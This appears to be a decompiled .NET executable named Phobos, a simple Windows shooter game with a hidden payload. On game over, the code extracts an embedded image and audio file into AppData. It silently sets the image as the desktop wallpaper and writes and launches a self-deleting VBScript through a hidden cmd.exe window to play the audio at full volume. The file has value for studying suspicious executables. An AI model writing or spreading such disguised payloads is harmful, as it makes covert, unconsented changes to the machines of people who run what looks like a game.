// Warning: Some assembly references could not be resolved automatically. This might lead to incorrect decompilation of some parts,
// for ex. property getter/setter access. To get optimal decompilation results, please manually add the missing references to the list of loaded assemblies.

// /home/aniko/Downloads/Phobos.exe
// Phobos, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// Global type: <Module>
// Entry point: Phobos.Program.Main
// Architecture: AnyCPU (32-bit preferred)
// Runtime: v4.0.30319
// Hash algorithm: SHA1

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Versioning;
using System.Windows.Forms;

[assembly: CompilationRelaxations(8)]
[assembly: RuntimeCompatibility(WrapNonExceptionThrows = true)]
[assembly: Debuggable(DebuggableAttribute.DebuggingModes.Default | DebuggableAttribute.DebuggingModes.DisableOptimizations | DebuggableAttribute.DebuggingModes.IgnoreSymbolStoreSequencePoints | DebuggableAttribute.DebuggingModes.EnableEditAndContinue)]
[assembly: AssemblyTitle("Phobos")]
[assembly: AssemblyDescription("")]
[assembly: AssemblyConfiguration("")]
[assembly: AssemblyCompany("")]
[assembly: AssemblyProduct("Phobos")]
[assembly: AssemblyCopyright("Copyright ©  2023")]
[assembly: AssemblyTrademark("")]
[assembly: ComVisible(false)]
[assembly: Guid("70395f7b-2f4b-4353-88c3-28e500beb84a")]
[assembly: AssemblyFileVersion("1.0.0.0")]
[assembly: TargetFramework(".NETFramework,Version=v4.7", FrameworkDisplayName = ".NET Framework 4.7")]
[assembly: AssemblyVersion("1.0.0.0")]
public class Functions
{
	private const int SPI_SETDESKWALLPAPER = 20;

	private const int SPIF_UPDATEINIFILE = 1;

	private const int SPIF_SENDCHANGE = 2;

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

	public static void SetDesktopBackground(string imagePath)
	{
		SystemParametersInfo(20, 0, imagePath, 3);
	}

	public static void Player(string filePath, bool songloop = false)
	{
		string environmentVariable = Environment.GetEnvironmentVariable("appdata");
		if (File.Exists(environmentVariable + "\\LastViewII\\player.vbs"))
		{
			File.Delete(environmentVariable + "\\LastViewII\\player.vbs");
		}
		string text = "";
		if (songloop)
		{
			text = "objPlayer.settings.setMode \"loop\", True";
		}
		string content = "Set objPlayer = CreateObject(\"WMPlayer.OCX\")\r\nSet x = CreateObject(\"Scripting.FileSystemObject\")\r\nSet y = CreateObject(\"Wscript.Shell\")\r\n\r\nappdatar = y.ExpandEnvironmentStrings(\"%APPDATA%\")\r\n\r\nobjPlayer.URL = \"" + filePath + "\"\r\nobjPlayer.settings.volume = 100\r\n" + text + "\r\nobjPlayer.controls.play\r\n\r\nDo While objPlayer.playState <> 1\r\n    if x.FileExists(appdatar & \"\\LastViewII\\stop.txt\") Then exit do\r\n    WScript.Sleep 100\r\nLoop\r\n\r\nobjPlayer.close\r\n\r\nSet objPlayer = Nothing\r\nif x.FileExists(appdatar & \"\\LastViewII\\stop.txt\") Then x.DeleteFile appdatar & \"\\LastViewII\\stop.txt\"\r\nif x.FileExists(Wscript.ScriptFullName) Then x.DeleteFile Wscript.ScriptFullName";
		WriteFile(environmentVariable + "\\LastViewII\\player.vbs", content);
		if (File.Exists(environmentVariable + "\\LastViewII\\player.vbs"))
		{
			Cmd("if exist \"%appdata%\\LastViewII\\player.vbs\" start \"\" \"%appdata%\\LastViewII\\player.vbs\"");
		}
		else
		{
			Player(filePath, songloop);
		}
	}

	public static void WriteFile(string path, string content)
	{
		try
		{
			if (File.Exists(path))
			{
				try
				{
					File.Delete(path);
				}
				catch
				{
				}
			}
			using StreamWriter streamWriter = new StreamWriter(path);
			streamWriter.Write(content);
		}
		catch
		{
		}
	}

	public static void Cmd(string command, bool wait = false)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/c " + command;
		process.StartInfo = processStartInfo;
		process.Start();
		if (wait)
		{
			process.WaitForExit();
		}
	}
}
public class GameForm : Form
{
	private int playerX;

	private int playerY;

	private List<int> bulletsX;

	private List<int> bulletsY;

	private List<int> enemiesX;

	private List<int> enemiesY;

	private int score;

	private int ammo;

	private string difficulty = "EASY";

	private int maxAmmo;

	private int reloadInterval;

	private Timer timer;

	private Timer reloadTimer;

	private float lolyMax = 10f;

	private float loly;

	public GameForm()
	{
		//IL_00ca: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d4: Expected O, but got Unknown
		//IL_00d6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e0: Expected O, but got Unknown
		//IL_0113: Unknown result type (might be due to invalid IL or missing references)
		//IL_011d: Expected O, but got Unknown
		((Control)this).Width = 1200;
		((Control)this).Height = ((Control)this).Width / 2 + ((Control)this).Width / 12;
		playerX = ((Control)this).Width / 2;
		playerY = ((Control)this).Height - 70;
		((Form)this).StartPosition = (FormStartPosition)1;
		bulletsX = new List<int>();
		bulletsY = new List<int>();
		enemiesX = new List<int>();
		enemiesY = new List<int>();
		score = 0;
		ammo = 15;
		maxAmmo = 20;
		reloadInterval = 2500;
		loly = lolyMax;
		((Control)this).KeyDown += new KeyEventHandler(GameForm_KeyDown);
		timer = new Timer();
		timer.Interval = 50;
		timer.Tick += Timer_Tick;
		timer.Start();
		reloadTimer = new Timer();
		reloadTimer.Interval = reloadInterval;
		reloadTimer.Tick += ReloadTimer_Tick;
		reloadTimer.Start();
	}

	private void GameForm_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0009: Invalid comparison between Unknown and I4
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Invalid comparison between Unknown and I4
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Invalid comparison between Unknown and I4
		//IL_0094: Unknown result type (might be due to invalid IL or missing references)
		//IL_009b: Invalid comparison between Unknown and I4
		//IL_00c7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ce: Invalid comparison between Unknown and I4
		if ((int)e.KeyCode == 65 && playerX > 0)
		{
			playerX -= 10;
		}
		else if ((int)e.KeyCode == 68 && playerX < ((Control)this).Width - 10)
		{
			playerX += 10;
		}
		else if ((int)e.KeyCode == 87 && playerY > 0)
		{
			playerY -= 10;
		}
		else if ((int)e.KeyCode == 83 && playerY < ((Control)this).Height - 10)
		{
			playerY += 10;
		}
		else if ((int)e.KeyCode == 32 && ammo > 0)
		{
			bulletsX.Add(playerX + 3);
			bulletsY.Add(playerY - 10);
			ammo--;
		}
	}

	private void Timer_Tick(object sender, EventArgs e)
	{
		Random random = new Random();
		if (random.Next(0, (int)loly) < 2)
		{
			enemiesX.Add(random.Next(0, ((Control)this).Width - 20));
			enemiesY.Add(0);
		}
		for (int i = 0; i < bulletsX.Count; i++)
		{
			bulletsY[i] -= 10;
			if (bulletsY[i] < 0)
			{
				bulletsX.RemoveAt(i);
				bulletsY.RemoveAt(i);
				i--;
				continue;
			}
			for (int j = 0; j < enemiesX.Count; j++)
			{
				if (bulletsX[i] >= enemiesX[j] && bulletsX[i] <= enemiesX[j] + 20 && bulletsY[i] <= enemiesY[j] + 20)
				{
					score++;
					bulletsX.RemoveAt(i);
					bulletsY.RemoveAt(i);
					i--;
					enemiesX.RemoveAt(j);
					enemiesY.RemoveAt(j);
					break;
				}
			}
		}
		for (int k = 0; k < enemiesX.Count; k++)
		{
			enemiesY[k] += 10;
			if (enemiesY[k] >= ((Control)this).Height)
			{
				enemiesX.RemoveAt(k);
				enemiesY.RemoveAt(k);
				k--;
			}
			else if (enemiesX[k] >= playerX - 20 && enemiesX[k] <= playerX + 20 && enemiesY[k] >= playerY - 20 && enemiesY[k] <= playerY + 20)
			{
				GameOver();
				return;
			}
		}
		((Control)this).Invalidate();
	}

	private void ReloadTimer_Tick(object sender, EventArgs e)
	{
		if (ammo < maxAmmo)
		{
			ammo++;
		}
		loly -= 1f;
		if (loly < 2f)
		{
			loly = 2f;
		}
		if (loly == lolyMax)
		{
			difficulty = "EASY";
		}
		else if (loly < 10f && loly > 6f)
		{
			difficulty = "MEDIUM";
		}
		else if (loly < 6f && loly > 3f)
		{
			difficulty = "HARD";
		}
		else if (loly < 3f)
		{
			difficulty = "EXTREME";
		}
	}

	protected override void OnPaintBackground(PaintEventArgs e)
	{
		((ScrollableControl)this).OnPaintBackground(e);
		e.Graphics.Clear(Color.Black);
	}

	protected override void OnPaint(PaintEventArgs e)
	{
		((Form)this).OnPaint(e);
		Graphics graphics = e.Graphics;
		for (int i = 0; i < bulletsX.Count; i++)
		{
			graphics.FillRectangle(Brushes.White, bulletsX[i], bulletsY[i], 4, 10);
		}
		for (int j = 0; j < enemiesX.Count; j++)
		{
			graphics.FillRectangle(Brushes.Red, enemiesX[j], enemiesY[j], 20, 20);
		}
		graphics.FillRectangle(Brushes.Blue, playerX - 10, playerY - 10, 20, 20);
		graphics.DrawString("Score: " + score, ((Control)this).Font, Brushes.White, 10f, 10f);
		graphics.DrawString("Ammo: " + ammo, ((Control)this).Font, Brushes.White, 10f, 30f);
		graphics.DrawString("Difficulty: " + difficulty, ((Control)this).Font, Brushes.White, 10f, 50f);
		graphics.DrawString("SLAY ALL!", ((Control)this).Font, Brushes.White, 10f, 70f);
	}

	private void GameOver()
	{
		timer.Stop();
		reloadTimer.Stop();
		GameOverLOL.LOL();
		((Form)this).Close();
	}
}
internal class GameOverLOL
{
	public static string appdatar = Environment.GetEnvironmentVariable("appdata");

	public static void LOL()
	{
		Taker.Take("lol.jpg", appdatar + "\\lol.jpg");
		Taker.Take("ce.mp3", appdatar + "\\ce.mp3");
		Functions.SetDesktopBackground(appdatar + "\\lol.jpg");
		Functions.Player(appdatar + "\\ce.mp3");
	}
}
internal class Taker
{
	public static void Take(string filename, string outputf = "false")
	{
		if (outputf == "false")
		{
			outputf = filename;
		}
		string name = Assembly.GetExecutingAssembly().GetName().Name;
		string name2 = name + "." + filename;
		using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream(name2);
		if (stream != null)
		{
			using (FileStream destination = File.Create(outputf))
			{
				stream.CopyTo(destination);
				return;
			}
		}
	}
}
namespace Phobos;

public class Program
{
	public static string appdatar = Environment.GetEnvironmentVariable("appdata");

	[STAThread]
	public static void Main()
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		Application.Run((Form)(object)new GameForm());
	}
}
